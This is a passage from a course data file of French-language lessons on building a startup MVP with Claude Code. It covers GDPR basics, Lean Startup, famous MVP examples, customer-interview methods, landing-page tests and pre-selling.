<li><strong>Mentions légales</strong> : Identifient le propriétaire du site (nom, adresse, SIRET/SIREN), l'hébergeur (Vercel, par exemple) et le responsable de la publication. Obligatoires en France pour tout site professionnel.</li>
</ul>
<p><strong>Astuce :</strong> Ne copie-colle pas la politique de confidentialité d'un autre site — elle ne sera pas adaptée à ton cas. Utilise un générateur spécialisé comme celui de la CNIL (cnil.fr) où demande à Claude : "Génère une politique de confidentialité RGPD pour un SaaS qui collecte emails, noms et données de paiement, hébergé sur Vercel avec une base de données PostgreSQL sur Railway." Il produira un document structuré et personnalisé.</p>
<p><strong>Attention :</strong> Le RGPD s'applique dès que tu lances ton MVP, même en version bêta. Même si tu n'as que 5 utilisateurs. Même si tu ne monétises pas encore. Le nombre d'utilisateurs ne change rien à tes obligations légales. Mets en place les bases dès le premier jour et tu seras tranquille par la suite.</p>

<blockquote>La sécurité et le RGPD ne sont pas des contraintes — ce sont des avantages concurrentiels. Un MVP sécurisé et conforme inspire confiance. Tes utilisateurs le remarqueront, et tes concurrents qui ne le font pas finiront par le payer cher.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Vérifie que ton projet a bien HTTPS activé en visitant ton URL de déploiement (Vercel, Railway où Render). Clique sur le cadenas dans la barre d'adresse pour inspecter le certificat SSL.</li>
<li>Demande à Claude : "Ajoute l'authentification NextAuth dans mon projet Next.js avec connexion par email (magic link) et par Google." Lis le code généré et identifie les mécanismes de sécurité : hashing, tokens, sessions.</li>
<li>Dans ton projet, vérifie que chaque route API qui accède à des données utilisateur vérifie bien que l'utilisateur connecté est le propriétaire de la ressource. Demande à Claude : "Audite mes routes API et vérifie qu'il n'y a pas de faille IDOR."</li>
<li>Crée une page <code>/politique-de-confidentialite</code> dans ton projet Next.js. Demande à Claude de générer le contenu adapté à ton MVP en précisant les données que tu collectes et les services tiers que tu utilises.</li>
<li>Implémente un bouton "Supprimer mon compte" qui supprime réellement les données de l'utilisateur en base de données. Demande à Claude : "Ajoute une fonctionnalité de suppression de compte qui respecte le RGPD, avec confirmation et suppression de toutes les données associées."</li>
</ol>`,
  },
  // ═══════════════════════════════════════════════════
  // MODULE 7 : Construire ton MVP avec Claude (7 leçons)
  // ═══════════════════════════════════════════════════

  {
    order: 39,
    module: 5,
    title: "Le MVP : définition et pourquoi c'est la clé",
    slug: "mvp-définition-pourquoi-clé",
    duration: "50 min",
    description: "Comprendre ce qu'est un MVP, pourquoi c'est la stratégie la plus intelligente pour lancer un produit, et comment l'IA change la donne.",
    content: `<h2>La définition d'un MVP</h2>
<p>MVP signifie Minimum Viable Product — en français, Produit Minimum Viable. C'est la version la plus simple de ton produit qui permet de tester ton hypothèse de départ avec de vrais utilisateurs. Pas un prototype. Pas une maquette. Un vrai produit, fonctionnel, que des gens peuvent utiliser — mais avec le strict minimum de fonctionnalités nécessaires pour résoudre un problème précis.</p>
<p>Le mot clé ici, c'est <strong>viable</strong>. Ton MVP doit apporter suffisamment de valeur pour que quelqu'un l'utilise réellement. Si tu crées une application de facturation, ton MVP doit permettre de créer une facture et de l'envoyer. Point. Pas de gestion des relances, pas de tableau de bord statistique, pas de multi-devises, pas de personnalisation avancée du template. Juste : créer une facture, entrer les informations du client, lister les prestations, calculer le total et envoyer un PDF par email.</p>
<p>L'erreur classique que font 90 % des entrepreneurs, c'est de confondre MVP avec "version dégradée du produit rêvé". Ce n'est pas ça. Un MVP, c'est un produit complet qui résout un seul problème de manière satisfaisante. La différence est fondamentale : tu ne construis pas 20 % de chaque fonctionnalité — tu construis 100 % d'une seule fonctionnalité.</p>
<p><strong>Astuce :</strong> Pour définir ton MVP, pose-toi cette question : "Si mon produit ne pouvait faire qu'une seule chose, laquelle serait-ce ?" La réponse est le coeur de ton MVP. Tout le reste est du bonus qui viendra plus tard, une fois que tu auras validé que cette chose unique intéresse vraiment des gens.</p>
<p>Eric Ries, le père du concept de Lean Startup, résume ça parfaitement : un MVP n'est pas le produit avec le moins de fonctionnalités possible, c'est la stratégie la plus rapide pour traverser le cycle Build-Measure-Learn avec le minimum d'effort. L'objectif n'est pas de construire moins — c'est d'apprendre plus vite.</p>
<p><strong>Conseil pro :</strong> Écris sur un post-it la phrase qui décrit ton MVP en une seule ligne. Par exemple : "Une app web où les freelances créent et envoient des factures en 2 minutes." Si tu ne peux pas la résumer en une phrase, ton MVP est probablement trop complexe.</p>

<h2>La philosophie Lean Startup</h2>
<p>Le MVP s'inscrit dans la philosophie Lean Startup, popularisée par Eric Ries dans son livre éponyme en 2011. L'idée fondamentale est simple : au lieu de passer des mois à construire un produit parfait dans ton coin, tu construis rapidement, tu mesures les résultats, tu apprends, puis tu recommences. C'est le cycle <strong>Build-Measure-Learn</strong> — construire, mesurer, apprendre.</p>
<p>Pourquoi ce cycle est-il si puissant ? Parce que la réalité est brutale : la plupart de tes hypothèses sur ce que veulent les utilisateurs sont fausses. Pas parce que tu es incompétent, mais parce qu'il est humainement impossible de prédire le comportement de milliers de personnes sans données réelles. Le Lean Startup accepte cette incertitude et la transforme en avantage.</p>

<h3>Le cycle Build-Measure-Learn</h3>
<ul>
<li><strong>Build (Construire)</strong> : Tu crées la version la plus simple possible de ton idée. Pas un plan sur 50 pages — un produit fonctionnel que tu peux mettre entre les mains de vrais utilisateurs. L'objectif est la vitesse : plus vite tu construis, plus vite tu apprends. Avec Claude Code, cette phase qui prenait des semaines se fait maintenant en quelques jours.</li>
<li><strong>Measure (Mesurer)</strong> : Tu collectes des données sur l'utilisation réelle. Combien de personnes s'inscrivent ? Combien reviennent le lendemain ? Combien cliquent sur le bouton "Payer" ? Tu ne te fies pas à tes impressions où aux compliments polis de tes amis — tu regardes les chiffres. Les métriques ne mentent pas.</li>
<li><strong>Learn (Apprendre)</strong> : Tu analyses les données et tu tires des conclusions. Ton hypothèse de départ était-elle correcte ? Les utilisateurs utilisent-ils la fonctionnalité que tu pensais être la plus importante ? Où ont-ils trouvé une autre utilité à ton produit que tu n'avais pas prévue ?</li>
</ul>
<p>Ce cycle doit tourner le plus vite possible. Chaque itération te rapproche de la vérité sur ce que veulent vraiment tes utilisateurs. Un entrepreneur qui fait 10 itérations en 3 mois apprendra infiniment plus qu'un autre qui passe 3 mois à peaufiner sa première version.</p>
<p><strong>Attention :</strong> Le piège classique est de rester bloqué dans la phase "Build" en ajoutant toujours "juste une fonctionnalité de plus" avant de lancer. C'est le syndrome du perfectionnisme. La vérité, c'est que tu apprends zéro tant que personne n'utilise ton produit. Un MVP imparfait entre les mains d'utilisateurs vaut infiniment plus qu'un produit parfait dans ton ordinateur.</p>
<p>Le concept de <strong>pivot</strong> est aussi central dans le Lean Startup. Si les données montrent que ton hypothèse est fausse, tu pivotes : tu changes de direction tout en conservant ce que tu as appris. Instagram a commencé comme une app de check-in géolocalisé (Burbn) avant de pivoter vers le partage de photos. Slack était un outil interne d'une entreprise de jeux vidéo qui a échoué. Le pivot n'est pas un échec — c'est une stratégie d'apprentissage.</p>
<p><strong>Conseil pro :</strong> Avant de coder quoi que ce soit, écris trois hypothèses testables. Par exemple : "Les freelances sont prêts à payer 9 euros par mois pour gagner du temps sur leur facturation", "Les freelances envoient en moyenne 5 factures par mois", "La fonctionnalité la plus demandée sera le suivi des paiements". Ton MVP doit te permettre de valider où invalider au moins une de ces hypothèses.</p>

<h2>Des MVPs célèbres qui ont changé le monde</h2>
<p>Les plus grandes entreprises tech du monde ont commencé avec des MVPs ridiculement simples. Étudier ces exemples te montre que la simplicité au démarrage n'est pas un signe de faiblesse — c'est une stratégie de génie.</p>

<h3>Dropbox : une vidéo de 3 minutes</h3>
<p>Drew Houston avait un problème : il oubliait toujours sa clé USB. Sa solution : un système de synchronisation de fichiers dans le cloud. Mais au lieu de passer des mois à coder un produit complexe, il a créé une simple vidéo de démonstration de 3 minutes montrant comment le produit fonctionnerait. Résultat : la liste d'attente est passée de 5 000 à 75 000 personnes en une nuit. Sans une seule ligne de code fonctionnel. La vidéo a prouvé que le problème était réel et que les gens voulaient cette solution.</p>

<h3>Airbnb : un appartement et un site basique</h3>
<p>Brian Chesky et Joe Gebbia ne pouvaient pas payer leur loyer à San Francisco. Pendant une conférence de design, ils ont gonflé des matelas pneumatiques dans leur salon et créé un site web ultra-basique pour proposer un hébergement à 80 dollars la nuit, petit-déjeuner inclus. Le site n'avait aucune fonctionnalité de paiement en ligne — les paiements se faisaient en personne. Trois personnes ont réservé. Ce petit test a validé l'hypothèse fondamentale : des inconnus sont prêts à dormir chez d'autres inconnus si le prix est attractif.</p>

<h3>Zappos : des photos et un magasin de chaussures</h3>
<p>Nick Swinmurn voulait tester si les gens achèteraient des chaussures en ligne (en 1999, l'idée semblait absurde). Au lieu de créer un stock et une logistique complète, il est allé dans des magasins de chaussures locaux, a pris des photos des modèles et les a mises sur un site web basique. Quand quelqu'un commandait, il retournait au magasin, achetait la paire au prix normal et l'expédiait lui-même. Zéro stock, zéro logistique, zéro risque. Il a perdu de l'argent sur chaque vente, mais il a prouvé que la demande existait. Amazon a racheté Zappos pour 1,2 milliard de dollars.</p>

<h3>Twitter : un service de SMS interne</h3>
<p>Twitter a commencé comme un outil de messagerie interne chez Odeo, une entreprise de podcasting en difficulté. Le premier prototype permettait simplement d'envoyer un SMS à un numéro court pour publier un message de 140 caractères (la limite venait des contraintes techniques des SMS). Pas de retweets, pas de hashtags, pas de fil d'actualité algorithmique. Juste des messages courts partagés avec un petit groupe. La simplicité radicale du concept était justement sa force.</p>

<h3>Buffer : une landing page à deux pages</h3>
<p>Joel Gascoigne voulait créer un outil pour programmer des publications sur les réseaux sociaux. Son MVP ? Deux pages web. La première présentait le concept et avait un bouton "Plans et tarifs". La deuxième affichait les prix et demandait une adresse email. Aucune fonctionnalité réelle — juste un test pour voir si des gens seraient intéressés et prêts à payer. Quand il a collecté suffisamment d'emails, il a commencé à coder. Buffer génère aujourd'hui des millions de dollars de revenus annuels.</p>
<p><strong>Astuce :</strong> Le point commun de tous ces exemples, c'est que les fondateurs ont testé l'hypothèse la plus risquée en premier. Pour Dropbox, c'était "les gens veulent-ils ce produit ?". Pour Zappos, c'était "les gens achèteront-ils des chaussures en ligne ?". Identifie l'hypothèse la plus risquée de ton projet et trouve le moyen le plus rapide de la tester.</p>

<h2>Les erreurs classiques à éviter</h2>
<p>Maintenant que tu comprends le concept de MVP, parlons des pièges dans lesquels tombent la majorité des entrepreneurs débutants. Connaître ces erreurs à l'avance te fera économiser des semaines, voire des mois de travail inutile.</p>

<h3>Erreur 1 : L'over-building — construire trop</h3>
<p>C'est l'erreur numéro un. Tu commences avec une idée simple, puis tu ajoutes "juste une fonctionnalité de plus". Puis une autre. Puis encore une autre. Trois mois plus tard, tu n'as toujours rien lancé et ton produit est devenu un monstre ingérable. Chaque fonctionnalité ajoutée augmente la complexité, les bugs potentiels et le temps de développement de manière exponentielle — pas linéaire.</p>
<p>La règle d'or : si tu peux lancer sans une fonctionnalité, ne la construis pas maintenant. Point. Tu la construiras quand tes utilisateurs la réclameront. Et souvent, ils ne la réclameront jamais parce qu'elle n'existait que dans ta tête.</p>

<h3>Erreur 2 : Pas de validation avant le code</h3>
<p>Coder avant de valider, c'est comme construire une maison sans vérifier si quelqu'un veut y habiter. Tu peux créer le plus beau produit du monde — si personne n'en a besoin, c'est un échec. Avant d'écrire la première ligne de code, tu dois avoir au moins 5 conversations sérieuses avec des utilisateurs potentiels et/où un signe concret de demande (emails collectés, pré-commandes, tweets enthousiastes).</p>

<h3>Erreur 3 : Le perfectionnisme</h3>
<p>"Je lance quand ce sera parfait." Cette phrase a tué plus de startups que n'importe quel concurrent. La perfection est l'ennemi du bien. Reid Hoffman, le fondateur de LinkedIn, dit : "Si tu n'as pas honte de la première version de ton produit, c'est que tu as lancé trop tard." Ton MVP aura des bugs, un design imparfait, des cas limites non gérés — et c'est parfaitement normal.</p>

<h3>Erreur 4 : Ignorer les métriques</h3>
<p>Lancer un MVP sans système de mesure, c'est naviguer sans boussole. Tu dois savoir combien de personnes s'inscrivent, combien utilisent réellement le produit, combien reviennent le lendemain, et combien seraient prêtes à payer. Sans ces données, tu prends des décisions basées sur des impressions et des suppositions — c'est une recette pour l'échec.</p>

<h3>Erreur 5 : Écouter tout le monde</h3>
<p>Quand tu lances ton MVP, tout le monde aura un avis. Ton oncle te dira d'ajouter un chatbot. Ton ami designer trouvera le logo trop petit. Un utilisateur demandera une intégration avec un outil obscur. Si tu écoutes tout le monde, tu finis avec un produit qui ne satisfait personne. Concentre-toi sur les retours de tes utilisateurs cibles — les personnes qui ont réellement le problème que tu résous.</p>
<p><strong>Attention :</strong> Les compliments ne sont pas de la validation. Quand tu montres ton idée à quelqu'un et qu'il dit "C'est super !", ça ne veut rien dire. La vraie validation, c'est quand quelqu'un sort sa carte bleue où revient utiliser ton produit le lendemain sans que tu le lui demandes.</p>

<h2>Comment définir ton MVP</h2>
<p>Passons à la pratique. Voici une méthode en 5 étapes pour définir ton MVP de manière structurée et efficace. Suis chaque étape dans l'ordre — elles sont conçues pour t'amener du floù à la clarté.</p>

<h3>Étape 1 : Définir le problème</h3>
<p>Avant de penser à la solution, tu dois articuler clairement le problème que tu résous. Utilise cette formule : "[Type de personne] a du mal à [action spécifique] parce que [raison]." Par exemple : "Les freelances français ont du mal à créer et envoyer des factures conformes parce que les outils existants sont trop complexes où trop chers." Si tu ne peux pas remplir cette phrase, ton problème n'est pas assez défini.</p>

<h3>Étape 2 : Identifier ta cible</h3>
<p>Tu ne peux pas servir tout le monde. Choisis un segment précis et étroit. Au lieu de "les freelances", cible "les freelances développeurs web en France qui facturent entre 3 et 10 clients par mois". Plus ta cible est précise, plus tu peux créer un produit qui leur parle directement. Tu pourras élargir plus tard.</p>

<h3>Étape 3 : Décrire la solution en une phrase</h3>
<p>Ta solution doit être exprimable en une seule phrase simple. "Une application web qui permet aux freelances de créer une facture conforme en 2 minutes et de l'envoyer par email en un clic." Si ta description nécessite un paragraphe entier, ta solution est probablement trop complexe pour un MVP.</p>

<h3>Étape 4 : Lister les fonctionnalités — puis en supprimer 80 %</h3>
<p>Fais la liste de toutes les fonctionnalités que tu imagines. Sois exhaustif : mets tout. Ensuite, classe-les en trois catégories :</p>
<ul>
<li><strong>Indispensable</strong> : Sans ça, le produit ne résout pas le problème. Maximum 3-5 fonctionnalités.</li>
<li><strong>Important</strong> : Ça améliore l'expérience mais le produit fonctionne sans. Pour la v2.</li>
<li><strong>Nice-to-have</strong> : Du bonus. Pour la v3 où plus tard. Probablement jamais.</li>
</ul>
<p>Ton MVP ne contient que les fonctionnalités "Indispensable". Le reste va dans un backlog pour plus tard.</p>

<h3>Étape 5 : Définir les métriques de succès</h3>
<p>Comment sauras-tu que ton MVP fonctionne ? Définis 2-3 métriques claires avant de coder. Par exemple : "50 inscriptions dans les 2 premières semaines", "10 utilisateurs actifs par semaine", "3 utilisateurs prêts à payer 9 euros/mois". Ces chiffres te donneront un critère objectif pour décider si tu continues, pivotes où abandonnes.</p>
<p><strong>Conseil pro :</strong> Utilise la méthode du "Wizard of Oz" pour les fonctionnalités complexes. Au lieu de tout automatiser, fais certaines choses manuellement au début. Par exemple, si ton MVP doit envoyer un rapport personnalisé chaque semaine, génère-le manuellement pour tes 10 premiers utilisateurs. Tu automatiseras quand tu auras validé que les gens veulent ce rapport.</p>

<h2>Le MVP à l'ère de l'IA</h2>
<p>Tout ce qu'on vient de voir reste vrai en 2025 — mais l'IA a fondamentalement changé les règles du jeu en termes de vitesse et de capacité. Avant l'IA, construire un MVP prenait au minimum plusieurs semaines, même pour un développeur expérimenté. Aujourd'hui, avec Claude Code, un non-développeur peut construire un MVP fonctionnel en quelques jours.</p>
<p>Voici ce qui a changé concrètement :</p>

<h3>Avant Claude Code</h3>
<ul>
<li>Apprendre à coder : 6-12 mois minimum pour être productif</li>
<li>Recruter un développeur freelance : 3 000 - 15 000 euros pour un MVP basique</li>
<li>Trouver un associé technique : des mois de networking sans garantie</li>
<li>Utiliser un outil no-code : possible mais limité en termes de personnalisation et de scalabilité</li>
<li>Délai typique pour un MVP : 2-6 mois</li>
<li>Budget typique : 5 000 - 20 000 euros (où des mois d'apprentissage)</li>
</ul>

<h3>Avec Claude Code</h3>
<ul>
<li>Tu décris ce que tu veux en français, Claude génère le code</li>
<li>Tu itères par conversation : "Change la couleur du bouton", "Ajoute un champ email au formulaire", "Crée une page de pricing avec 3 plans"</li>
<li>Tu déploies gratuitement sur Vercel en quelques clics</li>
<li>Délai typique pour un MVP : 1-2 semaines</li>
<li>Budget : l'abonnement Claude (environ 20 euros/mois) + un nom de domaine (10 euros/an)</li>
</ul>
<p>Cette démocratisation est historique. Pour la première fois, la barrière technique qui empêchait des millions de personnes de créer des produits numériques est en train de tomber. Tu n'as plus besoin d'être développeur pour construire un SaaS. Tu as besoin d'une bonne idée, d'une compréhension du problème que tu résous, et de savoir communiquer avec Claude Code.</p>
<p><strong>Attention :</strong> L'IA ne remplace pas la réflexion stratégique. Claude Code peut construire n'importe quoi en quelques jours — mais construire la mauvaise chose rapidement ne sert à rien. La phase de validation (dont on parle dans la prochaine leçon) reste absolument critique. L'IA accélère la construction, pas la compréhension du marché.</p>
<p><strong>Conseil pro :</strong> L'avantage le plus sous-estimé de l'IA pour les MVPs, c'est la vitesse d'itération. Avant, modifier une fonctionnalité prenait des jours. Maintenant, tu peux tester 5 variantes d'une même fonctionnalité en une journée. Cette vitesse d'itération te permet d'apprendre 5 fois plus vite que tes concurrents qui codent manuellement.</p>

<blockquote>Le meilleur MVP est celui que tu lances. Pas celui que tu perfectionnes indéfiniment. Avec Claude Code, tu n'as plus d'excuse pour ne pas lancer en une semaine. La seule question est : quel problème vas-tu résoudre ?</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Choisis une idée de produit qui te motive (où utilise celle-ci : une application de suivi de dépenses pour freelances). Écris la phrase problème : "[Type de personne] a du mal à [action] parce que [raison]."</li>
<li>Liste 15 fonctionnalités que tu imagines pour ce produit. Ensuite, classe-les en "Indispensable" (max 4), "Important" et "Nice-to-have". Ton MVP ne contiendra que les "Indispensable".</li>
<li>Décris ton MVP en une seule phrase de moins de 20 mots. Si tu n'y arrives pas, simplifie jusqu'à y arriver.</li>
<li>Définis 3 métriques de succès concrètes et mesurables pour ton MVP (exemple : "30 inscriptions en 2 semaines", "5 utilisateurs actifs quotidiens").</li>
<li>Demande à Claude : "Je veux créer [ton idée en une phrase]. Aide-moi à définir le MVP le plus simple possible. Quelles sont les 3-4 fonctionnalités absolument indispensables et quelles fonctionnalités je devrais reporter à plus tard ?"</li>
</ol>`,
  },
  {
    order: 40,
    module: 5,
    title: "Trouver et valider ton idée de produit",
    slug: "trouver-valider-idée-produit",
    duration: "55 min",
    description: "Apprendre à identifier un vrai problème, valider ta solution avec des méthodes concrètes et éviter de construire quelque chose dont personne ne veut.",
    content: `<h2>Une idée ne vaut rien sans validation</h2>
<p>Tu as peut-être déjà entendu cette phrase dans l'écosystème startup : "Les idées ne valent rien, seule l'exécution compte." C'est partiellement vrai. En réalité, une idée ne vaut rien tant qu'elle n'est pas validée. La validation, c'est le processus qui transforme une intuition en certitude — où qui te sauve de mois de travail inutile en te montrant que ton hypothèse était fausse.</p>
<p>Les statistiques sont sans appel : 42 % des startups échouent parce qu'il n'y a pas de demande pour leur produit. Pas à cause d'un mauvais produit, pas à cause d'un manque de financement, pas à cause de la concurrence — simplement parce que personne n'en voulait. Et dans la majorité des cas, les fondateurs auraient pu le découvrir en quelques semaines de validation au lieu de le découvrir après des mois de développement.</p>
<p>La validation n'est pas une étape optionnelle. C'est la fondation de tout ton projet. Si tu construis sur du sable (une hypothèse non validée), tout s'effondrera tôt où tard. Si tu construis sur du béton (une demande prouvée), tu as une base solide pour croître.</p>
<p><strong>Attention :</strong> "Mes amis trouvent que c'est une bonne idée" n'est pas de la validation. Tes amis veulent te faire plaisir. La vraie validation vient de personnes qui ne te connaissent pas, qui ont le problème que tu veux résoudre, et qui sont prêtes à agir concrètement (s'inscrire, payer, consacrer du temps) pour obtenir ta solution.</p>
<p>Dans cette leçon, tu vas apprendre des méthodes concrètes et éprouvées pour trouver un vrai problème, valider qu'il existe réellement, et t'assurer que des gens paieront pour ta solution. C'est le travail le plus important que tu feras — bien plus important que le code.</p>

<h2>Trouver un vrai problème</h2>
<p>Les meilleurs produits ne naissent pas d'une idée brillante sous la douche. Ils naissent de la frustration. D'un problème vécu personnellement, observé chez d'autres, où découvert en écoutant attentivement les plaintes des gens. Ton objectif est de devenir un chasseur de problèmes — pas un inventeur de solutions.</p>

<h3>Source 1 : Tes propres frustrations</h3>
<p>C'est la mine d'or la plus accessible. Quels outils utilises-tu au quotidien qui t'énervent ? Quelles tâches répétitives te prennent trop de temps ? Quel processus dans ton travail est inutilement compliqué ? Basecamp est né parce que ses créateurs en avaient marre des outils de gestion de projet existants. Notion est né parce que ses créateurs voulaient un outil unique au lieu de jongler entre 10 applications différentes.</p>
<p>Tiens un "journal de frustrations" pendant une semaine. Chaque fois que tu pestes contre un outil, un processus où une situation, note-le. À la fin de la semaine, tu auras une liste de problèmes réels — des problèmes que tu comprends intimement parce que tu les vis toi-même.</p>

<h3>Source 2 : Les forums et communautés</h3>
<p>Reddit, les groupes Facebook spécialisés, les forums de niche, les serveurs Discord — ces espaces regorgent de gens qui expriment ouvertement leurs problèmes. Cherche des fils de discussion qui commencent par "Est-ce que quelqu'un connaît un outil pour...", "Je suis frustré par...", "J'aimerais bien qu'il existe...". Ce sont des signaux de demande en or.</p>
<p>Par exemple, si tu explores le subreddit r/freelance, tu trouveras régulièrement des posts sur la difficulté de gérer les devis, de relancer les clients qui ne paient pas, où de suivre le temps passé sur chaque projet. Chacun de ces posts est un signal de marché.</p>

<h3>Source 3 : Twitter / X et LinkedIn</h3>
<p>Les professionnels partagent ouvertement leurs frustrations sur les réseaux sociaux. Cherche des termes comme "je déteste [outil]", "quelqu'un à une alternative à [service]", "je rêve d'un outil qui [fonctionnalité]". Utilise la recherche avancée pour filtrer par secteur où profession. Les threads qui accumulent des centaines de likes du type "Quel est votre plus gros problème au quotidien ?" sont des mines d'informations.</p>

<h3>Source 4 : Product Hunt et les Marketplaces</h3>
<p>Product Hunt te montre ce que les gens lancent — et les commentaires te montrent ce qui manque. Lis les commentaires négatifs sur les produits populaires : "Super mais il manque...", "J'adorerais si ça faisait aussi...". Ces commentaires sont des idées de produits validées par la frustration d'utilisateurs réels. Regarde aussi les produits qui ont été lancés mais qui ont peu d'engagement — parfois l'idée est bonne mais l'exécution est mauvaise. Tu peux faire mieux.</p>
<p><strong>Conseil pro :</strong> Ne cherche pas une idée révolutionnaire. Les meilleurs MVPs résolvent un problème existant de manière légèrement meilleure, plus simple, moins chère où plus adaptée à un segment spécifique. Tu n'as pas besoin de réinventer la roue — tu as besoin de faire une roue qui tourne mieux pour un type de véhicule précis.</p>

<h2>Parler à des clients potentiels</h2>
<p>Tu as identifié un problème qui te semble réel. Maintenant, tu dois vérifier que d'autres personnes le ressentent aussi et qu'elles seraient prêtes à payer pour une solution. La méthode la plus fiable pour ça, c'est l'entretien utilisateur. Pas un sondage envoyé par email — une vraie conversation en tête-à-tête.</p>

<h3>Pourquoi les entretiens et pas les sondages ?</h3>
<p>Un sondage te donne des réponses superficielles. Un entretien te donne la profondeur. Quand quelqu'un te dit dans un sondage "Oui, je serais intéressé par un outil de facturation", ça ne veut presque rien dire. Mais quand cette même personne, en entretien, te raconte pendant 10 minutes comment elle galère chaque mois avec ses factures, combien de temps ça lui prend, quel outil elle utilise actuellement et ce qui la frustre — là, tu as de la vraie matière.</p>

<h3>La méthode "Mom Test"</h3>
<p>Le livre "The Mom Test" de Rob Fitzpatrick est la référence pour mener des entretiens de validation. Le principe est simple : pose des questions sur le comportement passé, pas sur des intentions futures. Ta mère te dira toujours "Oui c'est une super idée !" — c'est inutile. Ce qui est utile, c'est de comprendre ce que les gens font réellement aujourd'hui.</p>
<p>Voici les bonnes questions à poser :</p>
<ul>
<li><strong>"Comment gères-tu [le problème] aujourd'hui ?"</strong> — Tu comprends la solution actuelle et ses limites.</li>
<li><strong>"Quelle est la partie la plus frustrante de ce processus ?"</strong> — Tu identifies le point de douleur exact.</li>
<li><strong>"Combien de temps ça te prend par semaine/mois ?"</strong> — Tu quantifies la douleur en temps (et donc en argent).</li>
<li><strong>"As-tu essayé d'autres solutions ? Lesquelles ?"</strong> — Tu comprends la concurrence et pourquoi elle ne satisfait pas.</li>
<li><strong>"Combien paies-tu actuellement pour résoudre ce problème ?"</strong> — Tu valides la disposition à payer.</li>
<li><strong>"Si un outil magique résolvait ce problème, qu'est-ce qu'il ferait exactement ?"</strong> — Tu découvres la solution idéale du point de vue de l'utilisateur.</li>
</ul>

<h3>Les questions à ne JAMAIS poser</h3>
<ul>
<li>"Est-ce que tu utiliserais un outil qui fait X ?" — Les gens disent toujours oui par politesse.</li>
<li>"Est-ce que tu trouves que c'est une bonne idée ?" — Même ta mère dirait oui.</li>
<li>"Combien serais-tu prêt à payer ?" — Les réponses hypothétiques ne valent rien. Observe ce qu'ils paient déjà.</li>
</ul>
<p><strong>Astuce :</strong> Fais au moins 10 entretiens avant de tirer des conclusions. Les 3 premiers seront maladroits — c'est normal. À partir du 5ème, tu commenceras à voir des patterns émerger. Si 7 personnes sur 10 mentionnent le même problème, tu tiens quelque chose.</p>

<h2>La landing page test</h2>
<p>Les entretiens te donnent des insights qualitatifs. La landing page test te donne des données quantitatives. L'idée est simple : tu crées une page web qui présente ton produit comme s'il existait déjà, et tu mesures combien de personnes s'inscrivent. C'est le test de validation le plus rapide et le plus fiable qui existe.</p>

<h3>Les éléments essentiels de ta landing page</h3>
<ul>
<li><strong>Un titre accrocheur (headline)</strong> : Il doit communiquer la proposition de valeur en moins de 10 mots. Exemple : "Crée et envoie tes factures en 2 minutes." Le visiteur doit comprendre immédiatement ce que fait ton produit et pourquoi ça l'intéresse.</li>
<li><strong>Une description du problème</strong> : 2-3 phrases qui décrivent la douleur que ton produit résout. Le lecteur doit se reconnaître. "Tu passes des heures chaque mois à créer tes factures sur Word ? Tu oublies de relancer les clients en retard de paiement ? Tu ne sais jamais combien tu as facturé ce trimestre ?"</li>
<li><strong>Les bénéfices clés</strong> : 3-4 points qui expliquent comment ton produit résout le problème. Pas les fonctionnalités techniques — les bénéfices pour l'utilisateur. Pas "export PDF" mais "Envoie des factures professionnelles que tes clients prennent au sérieux".</li>
<li><strong>Un formulaire d'inscription</strong> : Un simple champ email avec un bouton "M'inscrire à la bêta" où "Me prévenir du lancement". C'est ton indicateur de validation principal.</li>
<li><strong>Une preuve sociale</strong> (si possible) : Des témoignages, le nombre de personnes déjà inscrites, des logos d'entreprises intéressées.</li>
</ul>
<p>Tu peux créer cette landing page en une journée avec Claude Code. Demande-lui : "Crée une landing page pour [ton produit] avec un formulaire d'inscription email, un titre accrocheur, la description du problème et les bénéfices clés. Style moderne et professionnel avec Tailwind CSS."</p>
<p><strong>Conseil pro :</strong> Crée plusieurs variantes de ta landing page avec des titres différents et compare les taux de conversion. Un titre qui convertit à 15 % au lieu de 5 % te donne 3 fois plus de leads — et te montre quel angle marketing résonne le plus avec ta cible.</p>

<h2>Analyser les signaux</h2>
<p>Tu as ta landing page en ligne et tu envoies du trafic dessus (réseaux sociaux, forums, publicités). Maintenant, tu dois analyser les résultats. Mais attention : tous les signaux ne se valent pas. Il y à une hiérarchie de validation, du moins fiable au plus fiable.</p>

<h3>Niveau 1 : L'intérêt verbal (faible signal)</h3>
<p>"C'est une super idée !" Les compliments ne valent presque rien. Les gens sont polis. C'est le signal le plus facile à obtenir et le moins fiable. Ne te laisse pas aveugler par l'enthousiasme verbal — il ne prédit pas le comportement réel.</p>

<h3>Niveau 2 : L'inscription email (signal moyen)</h3>
<p>Quelqu'un qui te donne son email fait un effort, même minime. Un taux de conversion de 5-10 % sur ta landing page est un bon signe. En dessous de 2 %, ton message ne résonne probablement pas avec ta cible — il faut retravailler le positionnement où changer d'angle. Au-dessus de 15 %, tu tiens quelque chose de fort.</p>

<h3>Niveau 3 : L'engagement actif (bon signal)</h3>
<p>Les gens qui répondent à tes emails, qui posent des questions, qui partagent ta page avec leurs collègues, qui demandent "C'est pour quand ?" — ces comportements montrent un réel intérêt. Quand quelqu'un prend le temps de te répondre sans rien attendre en retour, c'est que le problème est réel pour lui.</p>

<h3>Niveau 4 : Le paiement (signal fort)</h3>
<p>Le signal ultime. Si quelqu'un sort sa carte bleue, c'est la preuve irréfutable que ton produit a de la valeur. Un pré-order, un abonnement early bird, un paiement même symbolique — c'est de l'or en barre. 10 personnes qui paient valent plus que 1 000 inscriptions gratuites.</p>
<p><strong>Astuce :</strong> Installe un outil d'analytics (Vercel Analytics est gratuit si tu déploies sur Vercel, où utilise Plausible pour du privacy-first) dès le premier jour de ta landing page. Note le nombre de visiteurs, le taux de conversion, les sources de trafic. Ces données te serviront pour toutes tes décisions futures.</p>

<h2>Le pré-selling</h2>
<p>Le pré-selling, c'est la technique de validation ultime : tu vends ton produit avant de le construire. Ça peut sembler contre-intuitif, voire malhonnête — mais c'est en fait la chose la plus respectueuse que tu puisses faire pour tes futurs clients. Tu leur offres un tarif réduit en échange de leur confiance, et tu t'assures que tu construis exactement ce qu'ils veulent.</p>

<h3>Comment faire du pré-selling</h3>
<ul>
<li><strong>L'offre early bird</strong> : "Inscris-toi maintenant à 9 euros/mois (au lieu de 19 euros) et sois parmi les premiers à utiliser [ton produit]. Accès garanti dès le lancement dans 4 semaines." Tu fixes un tarif réduit, une date de lancement et tu proposes un avantage exclusif. Les gens qui paient deviennent tes premiers testeurs et ambassadeurs.</li>
